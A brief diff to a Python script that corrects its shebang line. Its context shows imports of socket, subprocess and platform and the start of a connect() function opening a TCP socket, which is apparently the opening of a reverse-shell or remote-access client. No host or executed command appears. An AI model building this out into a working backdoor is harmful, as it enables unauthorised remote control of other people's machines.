@@ -1,4 +1,4 @@
-#usr/bin/python
+#/usr/bin/python
 import os,sys,socket,platform,subprocess
 def connect():
     connector = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
